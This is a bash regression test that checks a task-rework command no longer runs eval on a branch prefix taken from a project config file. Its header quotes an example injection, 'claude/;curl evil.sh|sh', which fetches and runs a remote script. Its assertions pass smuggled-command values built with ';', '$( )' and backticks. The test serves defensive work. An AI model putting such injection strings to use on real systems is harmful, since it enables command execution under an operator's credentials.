#!/usr/bin/env bash
# rework-no-eval.test.sh — a branchPrefix must never become a command.
#
# RV-5-2 (Critical, found by the review gate and reproduced by it before I fixed it).
# /quetrex:task-rework resolved its target with:
#     eval "$(qx_rework_target "$TASK" "$BRANCH_PREFIX" | sed 's/^/QX_/')"
# qx_rework_target emits raw `BASE=<prefix><epic>` lines, so a branchPrefix carrying a shell
# metacharacter — `claude/;curl evil.sh|sh` — became a command that eval ran. It sits on the
# epic-CHILD path this command exists to serve, inside an unattended cloud routine holding the
# operator's credentials, and every one of the file's nine fixtures used the benign `claude/`,
# so a 679-line test suite dedicated to this command never touched it.
#
# branchPrefix comes from .quetrex/project.json — committed data that anyone with repo write
# access controls, and that /quetrex:init writes.

set -uo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
MD="${QX_REWORK_MD:-$ROOT/.claude/commands/task-rework.md}"

PASS=0; FAIL=0
ok()    { PASS=$((PASS+1)); echo "ok - $1"; }
notok() { FAIL=$((FAIL+1)); echo "NOT OK - $1"; }

[ -f "$MD" ] || { echo "NOT OK - $MD not found"; exit 1; }

TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT
SENTINEL="$TMP/pwned"

# Build a runnable probe out of the SHIPPED text: the exec-block function plus the resolution
# block that consumes it. Executing the real thing is the point — a grep for "eval" would pass
# against a file that had merely moved the eval elsewhere.
python3 - "$MD" > "$TMP/probe.sh" <<'PY'
import re, sys
s = open(sys.argv[1]).read()
fn = re.search(r'qx_rework_target\(\) \{.*?\n\}\n', s, re.S)
blk = re.search(r'QX_KIND=""; QX_BASE=""; QX_EPIC=""\n.*?BASE_BRANCH="\$QX_BASE"', s, re.S)
legacy = re.search(r'^eval "\$\(qx_rework_target.*$', s, re.M)
if not fn:
    print('echo "PROBE-ERROR: qx_rework_target not found"; exit 9'); sys.exit(0)
print("#!/usr/bin/env bash\nset -uo pipefail")
print('TASK=\'{"identifier":"QDM-2.1","parentIdentifier":"QDM-2"}\'')
print('TASK_ID=QDM-2.1')
print('BRANCH_PREFIX="$1"')
print(fn.group(0))
if blk:
    print(blk.group(0))
elif legacy:
    print(legacy.group(0).replace('|| exit 1', '|| true'))
    print('BASE_BRANCH="$QX_BASE"')
else:
    print('echo "PROBE-ERROR: no resolution block found"; exit 9')
print('echo "KIND=${QX_KIND:-} BASE=${QX_BASE:-}"')
PY

# --- ASSERTION 1: the probe is real ------------------------------------------
if grep -q 'qx_rework_target()' "$TMP/probe.sh"; then
  ok "ASSERTION 1: extracted the shipped resolution path (the probe is not empty)"
else
  notok "ASSERTION 1: could not extract the resolution path — every assertion below would pass vacuously"
  echo; echo "rework-no-eval.test.sh: $PASS passed, $FAIL failed"; exit 1
fi

# --- ASSERTION 2: a hostile prefix must not execute --------------------------
rm -f "$SENTINEL"
OUT="$(bash "$TMP/probe.sh" "claude/;touch $SENTINEL;" 2>&1)"
if [ -f "$SENTINEL" ]; then
  notok "ASSERTION 2: COMMAND EXECUTION — a branchPrefix containing ';touch …' ran. An unattended routine would execute whatever the board's prefix says."
else
  ok "ASSERTION 2: a branchPrefix containing shell metacharacters does not execute"
fi

# --- ASSERTION 3: and it survives as literal text, not silently dropped -------
# Failing closed by mangling the value would hide the problem rather than fix it.
if printf '%s' "$OUT" | grep -q 'BASE=claude/;touch'; then
  ok "ASSERTION 3: the hostile prefix is carried through as inert text, not swallowed"
else
  notok "ASSERTION 3: the value did not survive intact (out: $(printf '%s' "$OUT" | head -c 120)) — check it is not being silently discarded"
fi

# --- ASSERTION 4: command substitution is inert too ---------------------------
rm -f "$SENTINEL"
bash "$TMP/probe.sh" 'claude/$(touch '"$SENTINEL"')' >/dev/null 2>&1
if [ -f "$SENTINEL" ]; then
  notok "ASSERTION 4: COMMAND EXECUTION via \$( ) in the prefix"
else
  ok "ASSERTION 4: a \$( ) in the prefix does not execute"
fi

# --- ASSERTION 5: backticks too ----------------------------------------------
rm -f "$SENTINEL"
bash "$TMP/probe.sh" 'claude/`touch '"$SENTINEL"'`' >/dev/null 2>&1
if [ -f "$SENTINEL" ]; then
  notok "ASSERTION 5: COMMAND EXECUTION via backticks in the prefix"
else
  ok "ASSERTION 5: backticks in the prefix do not execute"
fi

# --- ASSERTION 6: the ordinary path still works ------------------------------
OUT_OK="$(bash "$TMP/probe.sh" "claude/" 2>&1)"
if printf '%s' "$OUT_OK" | grep -q 'KIND=child' && printf '%s' "$OUT_OK" | grep -q 'BASE=claude/QDM-2'; then
  ok "ASSERTION 6: a normal prefix still resolves the child's integration branch"
else
  notok "ASSERTION 6: the benign path broke — got: $(printf '%s' "$OUT_OK" | head -c 120)"
fi

echo
echo "rework-no-eval.test.sh: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
